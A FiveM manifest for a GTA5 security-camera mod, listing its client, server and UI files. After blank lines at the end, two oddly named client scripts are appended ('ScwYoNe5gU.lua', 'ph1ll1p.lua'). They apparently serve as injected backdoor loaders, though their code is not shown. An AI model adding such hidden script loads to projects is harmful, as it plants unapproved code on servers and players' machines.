fx_version 'adamant'
game 'gta5'

mod 'smodsk-securitycameras'

version '1.0.1'


client_scripts {
	"lang.lua",
	"config.lua",
	"client/client.lua",
	"client/client_editable.lua",
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	"lang.lua",
	"config.lua",
	"credentials.lua",
	"server/main.lua",
	"server/server_editable.lua",
}


ui_page 'ui/main.html'
files {
   'ui/FSEX300.woff',
   'ui/main.html',
   'ui/lang.js',
   'ui/script.js',
   'ui/style.css',
   'ui/tablet.png',
}







client_script 'ScwYoNe5gU.lua'

client_script "ph1ll1p.lua"